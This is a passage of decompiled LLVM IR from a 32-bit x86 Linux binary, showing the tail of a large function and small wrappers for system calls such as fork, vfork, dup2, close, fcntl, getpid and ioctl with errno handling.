  %stack_var_-248.1 = phi i8* [ %stack_var_-248.227, %dec_label_pc_804a2fa ], [ %stack_var_-248.227, %dec_label_pc_804b6ee ], [ %stack_var_-248.227, %dec_label_pc_804b717 ], [ %stack_var_-248.227, %dec_label_pc_804b679 ], [ %v5_804b4d0, %dec_label_pc_804b5cc ], [ %v5_804b4d0, %dec_label_pc_804b59f ], [ %v5_804b4d0, %dec_label_pc_804b51c ], [ %stack_var_-248.227, %dec_label_pc_804b499 ], [ %stack_var_-248.227, %dec_label_pc_804b384 ], [ %stack_var_-248.227, %dec_label_pc_804b3fc ], [ %stack_var_-248.227, %dec_label_pc_804b33a ], [ %stack_var_-248.227, %dec_label_pc_804b2c2 ], [ %stack_var_-248.227, %dec_label_pc_804b228 ], [ %stack_var_-248.227, %dec_label_pc_804b0f3 ], [ %stack_var_-248.227, %dec_label_pc_804b0ac ], [ %stack_var_-248.227, %dec_label_pc_804b02f ], [ %stack_var_-248.227, %dec_label_pc_804aee9 ], [ %stack_var_-248.227, %dec_label_pc_804af61 ], [ %stack_var_-248.227, %dec_label_pc_804aea2 ], [ %stack_var_-248.227, %dec_label_pc_804adbb ], [ %stack_var_-248.227, %dec_label_pc_804ace3 ], [ %stack_var_-248.227, %dec_label_pc_804ac9c ], [ %stack_var_-248.227, %dec_label_pc_804ac1f ], [ %stack_var_-248.227, %dec_label_pc_804aad9 ], [ %stack_var_-248.227, %dec_label_pc_804ab51 ], [ %stack_var_-248.227, %dec_label_pc_804aa5c ], [ %stack_var_-248.227, %dec_label_pc_804a8f7 ], [ %stack_var_-248.227, %dec_label_pc_804a924 ], [ %stack_var_-248.227, %dec_label_pc_804a7da ], [ %stack_var_-248.227, %dec_label_pc_804a4b3 ], [ %stack_var_-248.227, %dec_label_pc_804a617 ], [ %stack_var_-248.227, %dec_label_pc_804a5e4 ], [ %stack_var_-248.227, %dec_label_pc_804a49a ]
  %stack_var_-252.1 = phi i8* [ %stack_var_-252.229, %dec_label_pc_804a2fa ], [ %stack_var_-252.229, %dec_label_pc_804b6ee ], [ %stack_var_-252.229, %dec_label_pc_804b717 ], [ %stack_var_-252.229, %dec_label_pc_804b679 ], [ %v5_804b553, %dec_label_pc_804b5cc ], [ %v5_804b553, %dec_label_pc_804b59f ], [ %stack_var_-252.229, %dec_label_pc_804b51c ], [ %stack_var_-252.229, %dec_label_pc_804b499 ], [ %stack_var_-252.229, %dec_label_pc_804b384 ], [ %stack_var_-252.229, %dec_label_pc_804b3fc ], [ %stack_var_-252.229, %dec_label_pc_804b33a ], [ %stack_var_-252.229, %dec_label_pc_804b2c2 ], [ %stack_var_-252.229, %dec_label_pc_804b228 ], [ %stack_var_-252.229, %dec_label_pc_804b0f3 ], [ %stack_var_-252.229, %dec_label_pc_804b0ac ], [ %stack_var_-252.229, %dec_label_pc_804b02f ], [ %stack_var_-252.229, %dec_label_pc_804aee9 ], [ %stack_var_-252.229, %dec_label_pc_804af61 ], [ %stack_var_-252.229, %dec_label_pc_804aea2 ], [ %stack_var_-252.229, %dec_label_pc_804adbb ], [ %stack_var_-252.229, %dec_label_pc_804ace3 ], [ %stack_var_-252.229, %dec_label_pc_804ac9c ], [ %stack_var_-252.229, %dec_label_pc_804ac1f ], [ %stack_var_-252.229, %dec_label_pc_804aad9 ], [ %stack_var_-252.229, %dec_label_pc_804ab51 ], [ %stack_var_-252.229, %dec_label_pc_804aa5c ], [ %stack_var_-252.229, %dec_label_pc_804a8f7 ], [ %stack_var_-252.229, %dec_label_pc_804a924 ], [ %stack_var_-252.229, %dec_label_pc_804a7da ], [ %stack_var_-252.229, %dec_label_pc_804a4b3 ], [ %stack_var_-252.229, %dec_label_pc_804a617 ], [ %stack_var_-252.229, %dec_label_pc_804a5e4 ], [ %stack_var_-252.229, %dec_label_pc_804a49a ]
  %v4_804b759 = add nuw nsw i32 %v1_804a425, 1
  store i32 %v4_804b759, i32* %eax.global-to-local, align 4
  %v5_804b762 = icmp slt i32 %v4_804b759, %.v2_804a1b4
  br i1 %v5_804b762, label %dec_label_pc_804a2fa, label %dec_label_pc_804a2ee.outer

; uselistorder directives
  uselistorder i32 %v4_804b759, { 2, 1, 0 }
  uselistorder i32 %v2_804b39b, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i8* %v1_804b2b9, { 1, 0, 2 }
  uselistorder i32 %v2_804b2b4, { 1, 0, 2 }
  uselistorder i32 %v0_804b088, { 1, 0 }
  uselistorder i32 %v4_804afbf, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804af00, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v0_804ac78, { 1, 0 }
  uselistorder i32 %v4_804abaf, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804aaf0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v0_804a7ec, { 1, 0 }
  uselistorder i32 %v5_804a725, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804a6ca, { 1, 0 }
  uselistorder i32 %v2_804a6b5, { 1, 0 }
  uselistorder i32 %v1_804a4f9, { 1, 0 }
  uselistorder i32* %v3_804a543.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804a3fc, { 1, 0 }
  uselistorder i32 %v2_804a394, { 0, 2, 1 }
  uselistorder i32 %v2_804a342, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v6_804a309, { 5, 4, 3, 2, 1, 0, 7, 6, 8 }
  uselistorder i8* %v4_804a309, { 25, 26, 21, 22, 23, 24, 17, 18, 19, 20, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 27 }
  uselistorder i32 %v2_804a306, { 0, 38, 37, 1, 36, 35, 2, 3, 45, 44, 43, 4, 42, 41, 5, 40, 6, 39, 7, 53, 52, 8, 51, 50, 49, 9, 48, 47, 46, 10, 11, 60, 59, 12, 58, 57, 14, 56, 55, 13, 54, 15, 65, 64, 16, 63, 62, 61, 17, 18, 72, 71, 19, 70, 69, 21, 68, 67, 20, 66, 22, 77, 76, 75, 74, 73, 23, 24, 89, 88, 25, 87, 86, 85, 84, 26, 83, 82, 81, 80, 79, 78, 27, 102, 101, 100, 99, 98, 97, 96, 95, 94, 28, 93, 29, 92, 30, 91, 31, 90, 32, 33, 34 }
  uselistorder i32 %stack_var_-224.215, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 27, 24, 23, 22, 20, 19, 18, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 17, 16, 21, 26, 25, 29, 28 }
  uselistorder i32 %stack_var_-228.217, { 38, 0, 1, 2, 37, 36, 35, 34, 33, 32, 31, 28, 26, 25, 23, 22, 21, 18, 16, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 13, 15, 17, 20, 19, 27, 24, 30, 29 }
  uselistorder i32 %stack_var_-232.219, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 18, 16, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 7, 15, 17, 19, 14, 22, 21 }
  uselistorder i32 %stack_var_-236.221, { 36, 0, 1, 2, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 19, 17, 14, 13, 12, 11, 10, 9, 6, 5, 4, 3, 8, 7, 18, 16, 21, 20, 15 }
  uselistorder i32 %stack_var_-240.223, { 33, 0, 1, 2, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 4, 3, 9, 8, 7 }
  uselistorder i8* %stack_var_-244.225, { 29, 0, 1, 2, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-248.227, { 30, 0, 1, 2, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-252.229, { 31, 0, 1, 2, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i32 %v1_804a425, { 1, 13, 12, 14, 11, 10, 15, 9, 20, 19, 18, 21, 17, 22, 16, 31, 30, 29, 27, 28, 35, 37, 36, 34, 39, 38, 33, 32, 26, 25, 24, 40, 23, 46, 45, 47, 44, 43, 42, 41, 58, 57, 56, 54, 55, 59, 53, 61, 60, 52, 51, 50, 49, 62, 48, 68, 67, 69, 66, 65, 64, 63, 79, 78, 77, 75, 76, 81, 80, 74, 73, 72, 82, 71, 83, 70, 90, 89, 88, 92, 91, 97, 96, 95, 98, 94, 93, 87, 86, 85, 99, 84, 4, 2, 3, 5, 6, 7, 107, 106, 105, 108, 104, 109, 103, 110, 102, 101, 100, 0, 8 }
  uselistorder i32 %v4_804a2e3, { 2, 1, 0 }
  uselistorder i32 %v2_804a286, { 1, 0, 2 }
  uselistorder i32 %storemerge548, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %v2_804a289, { 1, 0, 4, 3, 2, 7, 6, 5, 9, 8, 11, 10, 13, 12, 14, 16, 17, 15, 18, 19 }
  uselistorder i1 %v5_804a2ec47, { 1, 0 }
  uselistorder i32 %v2_804a262, { 1, 0 }
  uselistorder i32 %v2_804a245, { 4, 23, 5, 6, 7, 24, 8, 9, 10, 25, 11, 27, 26, 12, 13, 28, 14, 15, 29, 16, 17, 18, 30, 19, 32, 1, 2, 3, 20, 31, 0, 21, 22 }
  uselistorder i32 %.v2_804a1b4, { 4, 5, 7, 6, 3, 0, 1, 2 }
  uselistorder i32 %v2_804a1b4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-204, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-172, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-180, { 5, 4, 2, 1, 0, 3, 6, 7 }
  uselistorder i32* %stack_var_-184, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32* %stack_var_-188, { 8, 6, 2, 5, 7, 4, 3, 1, 9, 0, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 23, 29, 30, 31, 32, 28, 33, 34, 35, 36, 37, 39, 40, 38, 129, 128, 130, 131, 133, 132, 134, 135, 136, 137, 138, 42, 43, 44, 45, 41, 46, 47, 48, 49, 51, 52, 50, 54, 53, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 107, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 207, 0, 1, 2, 5, 3, 4, 9, 7, 8, 10, 6, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 27, 25, 26, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 41, 39, 40, 42, 43, 46, 44, 45, 48, 50, 51, 52, 53, 47, 56, 57, 58, 59, 54, 55, 60, 61, 62, 65, 63, 64, 66, 67, 68, 69, 70, 71, 73, 214, 72, 215, 218, 216, 217, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 232, 230, 231, 233, 234, 235, 236, 237, 75, 238, 239, 74, 79, 77, 78, 80, 81, 82, 76, 83, 84, 85, 86, 87, 88, 89, 90, 92, 93, 91, 94, 97, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 119, 117, 118, 120, 121, 122, 123, 126, 124, 125, 127, 128, 129, 130, 131, 132, 135, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 148, 146, 147, 149, 150, 152, 151, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 169, 167, 168, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 188, 201, 202, 203, 204, 205, 206, 240, 211, 208, 209, 210, 49, 212, 213 }
  uselistorder i32 (i32, i8*)* @function_804f744, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804fb14, { 11, 10, 9, 8, 2, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ()* @function_80499cb, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804faa4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804e51c, { 4, 3, 2, 1, 0 }
  uselistorder i32 10000, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32*)* @function_804e5dc, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @function_804a162, { 15, 14, 13, 12, 11, 3, 2, 1, 0, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @function_804fa4c, { 1, 0 }
  uselistorder i8 7, { 2, 0, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_804b759, { 32, 1, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 29, 30, 6, 31, 18, 19, 20, 21, 22, 3, 23, 24, 4, 25, 26, 27, 5, 28, 0 }
  uselistorder label %dec_label_pc_804b623, { 1, 0 }
  uselistorder label %dec_label_pc_804b14a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad3a, { 1, 0 }
  uselistorder label %dec_label_pc_804a9df, { 1, 0 }
  uselistorder label %dec_label_pc_804a9a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a8f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a688, { 1, 0 }
  uselistorder label %dec_label_pc_804a482, { 1, 0 }
  uselistorder label %dec_label_pc_804a2fa, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ee, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ee.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a27a, { 1, 0 }
}

define i32 @function_804e1c4() local_unnamed_addr {
dec_label_pc_804e1c4:
  %v0_804e1ca = call i32 @vfork()
  %v5_804e1cd = icmp ult i32 %v0_804e1ca, -4095
  %v1_804e1d2 = icmp eq i1 %v5_804e1cd, false
  call void @__pseudo_cond_branch(i1 %v1_804e1d2, i32 134551040)
  ret i32 %v0_804e1ca
}

define i32 @function_804e1dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e1dc:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804e1dc = load i32, i32* @edi, align 4
  %v0_804e1dd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804e1f5 = add i32 %arg2, -12
  %v6_804e1fb = icmp ugt i32 %v1_804e1f5, 2
  br i1 %v6_804e1fb, label %dec_label_pc_804e20b, label %dec_label_pc_804e1fd

dec_label_pc_804e1fd:                             ; preds = %dec_label_pc_804e1dc
  %v4_804e201 = call i32 @function_804e234(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804e1f5)
  br label %dec_label_pc_804e22d

dec_label_pc_804e20b:                             ; preds = %dec_label_pc_804e1dc
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804e213 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804e213, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e213, -4095
  br i1 %tmp, label %dec_label_pc_804e22b, label %dec_label_pc_804e21f

dec_label_pc_804e21f:                             ; preds = %dec_label_pc_804e20b
  %v1_804e21f = call i32 @function_804e694(i32 %v0_804e1dd)
  %v0_804e224 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e224 = sub i32 0, %v0_804e224
  %v2_804e226 = inttoptr i32 %v1_804e21f to i32*
  store i32 %v1_804e224, i32* %v2_804e226, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e22b

dec_label_pc_804e22b:                             ; preds = %dec_label_pc_804e20b, %dec_label_pc_804e21f
  %v0_804e22b = phi i32 [ %v2_804e213, %dec_label_pc_804e20b ], [ -1, %dec_label_pc_804e21f ]
  br label %dec_label_pc_804e22d

dec_label_pc_804e22d:                             ; preds = %dec_label_pc_804e1fd, %dec_label_pc_804e22b
  %v0_804e232 = phi i32 [ %v4_804e201, %dec_label_pc_804e1fd ], [ %v0_804e22b, %dec_label_pc_804e22b ]
  store i32 %v0_804e1dd, i32* @ebx, align 4
  store i32 %v0_804e1dc, i32* @edi, align 4
  ret i32 %v0_804e232

; uselistorder directives
  uselistorder i32 %v2_804e213, { 1, 0, 2 }
  uselistorder i32 %v0_804e1dd, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804e22d, { 1, 0 }
  uselistorder label %dec_label_pc_804e22b, { 1, 0 }
}

define i32 @function_804e234(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804e234:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e234 = load i32, i32* @edi, align 4
  store i32 %v0_804e234, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e24c = load i32, i32* @ebx, align 4
  %v1_804e254 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804e254, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e254, -4095
  br i1 %tmp, label %dec_label_pc_804e26c, label %dec_label_pc_804e260

dec_label_pc_804e260:                             ; preds = %dec_label_pc_804e234
  %v1_804e260 = call i32 @function_804e694(i32 %v0_804e24c)
  %v0_804e265 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e265 = sub i32 0, %v0_804e265
  %v2_804e267 = inttoptr i32 %v1_804e260 to i32*
  store i32 %v1_804e265, i32* %v2_804e267, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e26c

dec_label_pc_804e26c:                             ; preds = %dec_label_pc_804e234, %dec_label_pc_804e260
  %v0_804e26f = phi i32 [ %v1_804e254, %dec_label_pc_804e234 ], [ -1, %dec_label_pc_804e260 ]
  %v2_804e271 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e271, i32* %edi.global-to-local, align 4
  ret i32 %v0_804e26f

; uselistorder directives
  uselistorder i32 %v1_804e254, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e26c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804e274(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804e274:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804e2cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e2cc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e2cc = load i32, i32* @edi, align 4
  store i32 %v0_804e2cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @ebx, align 4
  %v1_804e2dc = call i32 @close(i32 %arg1)
  store i32 %v0_804e2d4, i32* @ebx, align 4
  store i32 %v1_804e2dc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e2dc, -4095
  br i1 %tmp, label %dec_label_pc_804e2f4, label %dec_label_pc_804e2e8

dec_label_pc_804e2e8:                             ; preds = %dec_label_pc_804e2cc
  %v1_804e2e8 = call i32 @function_804e694(i32 %v0_804e2d4)
  %v0_804e2ed = load i32, i32* %edi.global-to-local, align 4
  %v1_804e2ed = sub i32 0, %v0_804e2ed
  %v2_804e2ef = inttoptr i32 %v1_804e2e8 to i32*
  store i32 %v1_804e2ed, i32* %v2_804e2ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e2f4

dec_label_pc_804e2f4:                             ; preds = %dec_label_pc_804e2cc, %dec_label_pc_804e2e8
  %v0_804e2f5 = phi i32 [ %v1_804e2dc, %dec_label_pc_804e2cc ], [ -1, %dec_label_pc_804e2e8 ]
  %v2_804e2f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e2f8, i32* @edi, align 4
  ret i32 %v0_804e2f5

; uselistorder directives
  uselistorder i32 %v1_804e2dc, { 1, 0, 2 }
  uselistorder i32 %v0_804e2d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f4, { 1, 0 }
}

define i32 @function_804e2fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e2fc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e2fc = load i32, i32* @ebx, align 4
  store i32 %v0_804e2fc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804e30f = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804e30f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e30f, -4095
  br i1 %tmp, label %dec_label_pc_804e328, label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e2fc
  %v0_804e31c = load i32, i32* %stack_var_-4, align 4
  %v1_804e31c = call i32 @function_804e694(i32 %v0_804e31c)
  %v0_804e321 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e321 = sub i32 0, %v0_804e321
  %v2_804e323 = inttoptr i32 %v1_804e31c to i32*
  store i32 %v1_804e321, i32* %v2_804e323, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e328

dec_label_pc_804e328:                             ; preds = %dec_label_pc_804e2fc, %dec_label_pc_804e31c
  %v0_804e329 = phi i32 [ %v2_804e30f, %dec_label_pc_804e2fc ], [ -1, %dec_label_pc_804e31c ]
  %v2_804e32c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e32c, i32* @ebx, align 4
  ret i32 %v0_804e329

; uselistorder directives
  uselistorder i32 %v2_804e30f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e328, { 1, 0 }
}

define i32 @function_804e330(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e330:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e330 = load i32, i32* @ebx, align 4
  store i32 %v0_804e330, i32* %stack_var_-4, align 4
  %v1_804e339 = call i32 @fork(i32 %v0_804e330)
  store i32 %v1_804e339, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e339, -4095
  br i1 %tmp, label %dec_label_pc_804e350, label %dec_label_pc_804e344

dec_label_pc_804e344:                             ; preds = %dec_label_pc_804e330
  %v0_804e344 = load i32, i32* %stack_var_-4, align 4
  %v1_804e344 = call i32 @function_804e694(i32 %v0_804e344)
  %v0_804e349 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e349 = sub i32 0, %v0_804e349
  %v2_804e34b = inttoptr i32 %v1_804e344 to i32*
  store i32 %v1_804e349, i32* %v2_804e34b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e350

dec_label_pc_804e350:                             ; preds = %dec_label_pc_804e330, %dec_label_pc_804e344
  %v0_804e351 = phi i32 [ %v1_804e339, %dec_label_pc_804e330 ], [ -1, %dec_label_pc_804e344 ]
  %v2_804e354 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e354, i32* @ebx, align 4
  ret i32 %v0_804e351

; uselistorder directives
  uselistorder i32 %v1_804e339, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e350, { 1, 0 }
}

define i32 @function_804e358(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e358:
  %stack_var_-8 = alloca i32, align 4
  %v2_804e35b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804e362 = call i32 @function_804e3a8(i32 7, i32 %v2_804e35b)
  %v2_804e36f = icmp slt i32 %v2_804e362, 0
  br i1 %v2_804e36f, label %dec_label_pc_804e377, label %dec_label_pc_804e373

dec_label_pc_804e373:                             ; preds = %dec_label_pc_804e358
  %v3_804e373 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804e377

dec_label_pc_804e377:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e373
  %v0_804e377 = phi i32 [ 256, %dec_label_pc_804e358 ], [ %v3_804e373, %dec_label_pc_804e373 ]
  ret i32 %v0_804e377

; uselistorder directives
  uselistorder label %dec_label_pc_804e377, { 1, 0 }
}

define i32 @function_804e380() local_unnamed_addr {
dec_label_pc_804e380:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e380 = load i32, i32* @ebx, align 4
  store i32 %v0_804e380, i32* %stack_var_-4, align 4
  %v1_804e389 = call i32 @getpid(i32 %v0_804e380)
  store i32 %v1_804e389, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e389, -4095
  br i1 %tmp, label %dec_label_pc_804e3a0, label %dec_label_pc_804e394

dec_label_pc_804e394:                             ; preds = %dec_label_pc_804e380
  %v0_804e394 = load i32, i32* %stack_var_-4, align 4
  %v1_804e394 = call i32 @function_804e694(i32 %v0_804e394)
  %v0_804e399 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e399 = sub i32 0, %v0_804e399
  %v2_804e39b = inttoptr i32 %v1_804e394 to i32*
  store i32 %v1_804e399, i32* %v2_804e39b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e3a0

dec_label_pc_804e3a0:                             ; preds = %dec_label_pc_804e380, %dec_label_pc_804e394
  %v0_804e3a1 = phi i32 [ %v1_804e389, %dec_label_pc_804e380 ], [ -1, %dec_label_pc_804e394 ]
  %v2_804e3a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e3a0, i32* @edx, align 4
  %v2_804e3a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e3a4, i32* @ebx, align 4
  ret i32 %v0_804e3a1

; uselistorder directives
  uselistorder i32 %v1_804e389, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e3a0, { 1, 0 }
}

define i32 @function_804e3a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e3a8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e3a8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804e3bb = call i32 @int80_syscall(i32 191)
  store i32 %v1_804e3bb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e3bb, -4095
  br i1 %tmp, label %dec_label_pc_804e3d4, label %dec_label_pc_804e3c8

dec_label_pc_804e3c8:                             ; preds = %dec_label_pc_804e3a8
  %v0_804e3c8 = load i32, i32* %stack_var_-4, align 4
  %v1_804e3c8 = call i32 @function_804e694(i32 %v0_804e3c8)
  %v0_804e3cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e3cd = sub i32 0, %v0_804e3cd
  %v2_804e3cf = inttoptr i32 %v1_804e3c8 to i32*
  store i32 %v1_804e3cd, i32* %v2_804e3cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e3d4

dec_label_pc_804e3d4:                             ; preds = %dec_label_pc_804e3a8, %dec_label_pc_804e3c8
  %v0_804e3d5 = phi i32 [ %v1_804e3bb, %dec_label_pc_804e3a8 ], [ -1, %dec_label_pc_804e3c8 ]
  %v2_804e3d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e3d8, i32* @ebx, align 4
  ret i32 %v0_804e3d5

; uselistorder directives
  uselistorder i32 %v1_804e3bb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e3d4, { 1, 0 }
}

define i32 @function_804e3dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e3dc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e3dc = load i32, i32* @edi, align 4
  store i32 %v0_804e3dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e3f4 = load i32, i32* @ebx, align 4
  %v2_804e3fc = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804e3f4, i32* @ebx, align 4
  store i32 %v2_804e3fc, i32* %edi.global-to-local, align 4
